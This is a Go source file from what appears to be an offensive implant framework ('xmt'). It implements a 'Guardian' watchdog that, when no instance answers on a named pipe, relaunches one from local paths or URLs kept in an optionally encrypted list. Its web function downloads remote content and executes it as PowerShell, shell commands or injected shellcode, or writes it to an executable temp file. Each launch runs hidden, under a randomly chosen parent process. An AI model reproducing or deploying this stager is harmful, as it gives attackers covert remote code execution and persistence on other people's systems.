package man

import (
	"bytes"
	"context"
	"crypto/cipher"
	"crypto/rand"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com/pipe"
	"github.com/iDigitalFlame/xmt/data/crypto"
	"github.com/iDigitalFlame/xmt/device"
	"github.com/iDigitalFlame/xmt/util"
	"github.com/iDigitalFlame/xmt/util/xerr"
)

const (
	timeout    = time.Second * 2
	timeoutWeb = time.Second * 30
)

var (
	// ErrNoEndpoints is an error returned if no valid Guardian paths could be used and/or found during a launch.
	ErrNoEndpoints = xerr.New("no Guardian paths found")

	client = &http.Client{
		Timeout: timeoutWeb,
		Transport: &http.Transport{
			Proxy:                 http.ProxyFromEnvironment,
			DialContext:           (&net.Dialer{Timeout: timeoutWeb, KeepAlive: timeoutWeb, DualStack: true}).DialContext,
			MaxIdleConns:          64,
			IdleConnTimeout:       timeoutWeb,
			TLSHandshakeTimeout:   timeoutWeb,
			ExpectContinueTimeout: timeoutWeb,
			ResponseHeaderTimeout: timeoutWeb,
		},
	}
)

// Check will attempt to contact any current Guardians watching on the supplied name. This function returns false
// if the specified name could not be reached or an error occurred.
func Check(n string) bool {
	c, err := pipe.DialTimeout(pipe.Format(n), timeout)
	if err != nil {
		return false
	}
	var (
		b    = *bufs.Get().(*[]byte)
		_, _ = util.Rand.Read(b[1:])
		h    = crypto.SHA512(b[1:])
	)
	b[0] = 0xFF
	c.SetDeadline(time.Now().Add(timeout))
	if _, err := c.Write(b); err != nil {
		c.Close()
		bufs.Put(&b)
		return false
	}
	if n, err := c.Read(b); err != nil || n != 65 {
		c.Close()
		bufs.Put(&b)
		return false
	}
	bufs.Put(&b)
	if c.Close(); b[0] == 0xA0 && bytes.Equal(b[1:], h) {
		return true
	}
	return false
}
func file(p ...string) error {
	e := cmd.NewProcess(p...)
	e.SetParentRandomEx(nil, device.Local.Elevated)
	e.SetWindowDisplay(0)
	e.SetNoWindow(true)
	return e.Start()
}
func read(r io.Reader) ([]string, error) {
	var (
		b      = *bufs.Get().(*[]byte)
		n, err = r.Read(b[0:2])
	)
	if n = int(uint16(b[1]) | uint16(b[0])<<8); err != nil || n <= 0 {
		bufs.Put(&b)
		return nil, err
	}
	var (
		c int
		x strings.Builder
		s = make([]string, n)
	)
	for x.Grow(len(b)); ; {
		if n, err = r.Read(b); n == 0 && err != nil {
			break
		}
		for i := 0; i < n; i++ {
			if b[i] == 0x1E {
				s[c] = x.String()
				x.Reset()
				c++
				continue
			}
			x.WriteByte(b[i])
		}
	}
	if err == nil || err == io.EOF {
		return s, nil
	}
	return s, err
}
func write(w io.Writer, s []string) error {
	var (
		n      = len(s)
		_, err = w.Write([]byte{byte(n >> 8), byte(n)})
	)
	if err != nil {
		return err
	}
	for i := range s {
		if _, err := w.Write([]byte(s[i])); err != nil {
			return err
		}
		if _, err := w.Write([]byte{0x1E}); err != nil {
			return err
		}
	}
	return nil
}
func web(x context.Context, u string) error {
	var (
		q, c = context.WithTimeout(x, timeout*5)
		r, _ = http.NewRequestWithContext(q, http.MethodGet, u, nil)
	)
	i, err := client.Do(r)
	if c(); err != nil {
		return err
	}
	b, err := ioutil.ReadAll(i.Body)
	if i.Body.Close(); err != nil {
		return err
	}
	switch strings.ToLower(i.Header.Get("Content-Type")) {
	case "powershell", "application/powershell":
		if device.OS == device.Windows {
			return file("powershell.exe", "-Comm", string(b))
		}
		return file("pwsh", "-Comm", string(b))
	case "cmd", "execute", "script", "application/cmd", "application/script":
		if device.OS == device.Windows {
			return file("cmd.exe", "/c", string(b))
		}
		return file("sh", "-c", string(b))
	case "shellcode", "code", "binary", "bin", "application/binary", "application/executable", "application/shellcode":
		e := cmd.Code{Data: b}
		e.SetParentRandomEx(nil, device.Local.Elevated)
		return e.Start()
	}
	f, err := ioutil.TempFile("", "sys")
	if err != nil {
		return err
	}
	_, err = f.Write(b)
	if f.Close(); err != nil {
		return err
	}
	os.Chmod(f.Name(), 0755)
	return file(f.Name())
}

// Wake will attempt to contact any current Guardians watching on the supplied name. The Sentinel will launch a
// Guardian using the supplied paths and/or URLs, if no correct response is found or returned. This function
// will return true and nil if a Guardian is launched and false and nil if a Guardian was found.
func Wake(name string, paths ...string) (bool, error) {
	return WakeContext(context.Background(), name, paths...)
}

// Encode will attempt to write the data of the suplied string array into a encode byte array. If the supplied Cipher
// block is not nil, this will attempt to use the Cipher and append a randomized IV value to the beginning of the
// output. This function returns an error if the encoding fails.
func Encode(c cipher.Block, s []string) ([]byte, error) {
	var (
		b   *bytes.Buffer
		err error
	)
	if c == nil {
		err = write(b, s)
	} else {
		err = writeCipher(b, c, s)
	}
	return b.Bytes(), err
}

// EncodeFile will attempt to write the data of the supplied string array into to the specified file path. If the
// supplied Cipher block is not nil, this will attempt to use the Cipher and append a randomized IV value to the
// beginning of the file. This function returns an error if the write or file creation errors occur.
func EncodeFile(file string, c cipher.Block, s []string) error {
	f, err := os.OpenFile(file, os.O_RDWR|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	if c == nil {
		err = write(f, s)
	} else {
		err = writeCipher(f, c, s)
	}
	f.Close()
	return err
}
func readCipher(r io.Reader, c cipher.Block) ([]string, error) {
	var (
		n               = c.BlockSize()
		l               = n
		s      []string = nil
		b, a   []byte   = *bufs.Get().(*[]byte), nil
		_, err          = r.Read(b[:n])
	)
	if err == nil && n > len(b) {
		a, l = make([]byte, n-len(b)), len(b)
		_, err = r.Read(a)
	}
	if err == nil {
		i, _ := crypto.DecryptReader(c, append(b[:l], a...), r)
		s, err = read(i)
		i.Close()
	}
	bufs.Put(&b)
	return s, err
}

// WakeFile will attempt to look for a Guardian using the following parameters specified. This includes a
// local file path where the Guardian binaries or URLS may be located. This file is a file that was written using
// the 'Encode' or 'EncodeFile' functions and can use the supplied cipher block if needed.
func WakeFile(name, file string, c cipher.Block) (bool, error) {
	return WakeFileContext(context.Background(), name, file, c)
}
func writeCipher(w io.Writer, c cipher.Block, s []string) error {
	var (
		n           = c.BlockSize()
		l           = n
		b, a []byte = *bufs.Get().(*[]byte), nil
	)
	if rand.Read(b); len(b) < n {
		a, l = make([]byte, n-len(b)), len(b)
		rand.Read(a)
	}
	_, err := w.Write(b[:l])
	if err == nil && len(a) > 0 {
		_, err = w.Write(a)
	}
	if err == nil {
		o, _ := crypto.EncryptWriter(c, append(b[:l], a...), w)
		err = write(o, s)
		o.Close()
	}
	bufs.Put(&b)
	return err
}

// WakeContext will attempt to contact any current Guardians watching on the supplied name. This will launch a
// Guardian using the supplied paths and/or URLs, if no correct response is found or returned. This function
// will return true and nil if a Guardian is launched and false and nil if a Guardian was found. This function
// will additionally take a Context that can be used to cancel any attempts when downloading.
func WakeContext(x context.Context, name string, paths ...string) (bool, error) {
	if Check(name) {
		return false, nil
	}
	if len(paths) == 0 {
		return false, ErrNoEndpoints
	}
	var err error
	for i := range paths {
		if len(paths[i]) == 0 {
			continue
		}
		if strings.HasPrefix(paths[i], "http") {
			err = web(x, paths[i])
		} else if _, err = os.Stat(paths[i]); err == nil {
			err = file(paths[i])
		}
		if err == nil {
			return true, nil
		}
	}
	if err != nil {
		return false, xerr.Wrap(err.Error(), ErrNoEndpoints)
	}
	return false, ErrNoEndpoints
}

// WakeFileContext will attempt to look for a Guardian using the following parameters specified. This includes a
// local file path where the Guardian binaries or URLS may be located. This file is a file that was written using
// the 'Encode' or 'EncodeFile' functions. This function will additionally take a Context that can be used to
// cancel any attempts when downloading.
func WakeFileContext(x context.Context, name, file string, c cipher.Block) (bool, error) {
	f, err := os.OpenFile(file, os.O_RDONLY, 0)
	if err != nil {
		return false, err
	}
	var s []string
	if c == nil {
		s, err = read(f)
	} else {
		s, err = readCipher(f, c)
	}
	if f.Close(); err != nil {
		return false, err
	}
	return WakeContext(x, name, s...)
}
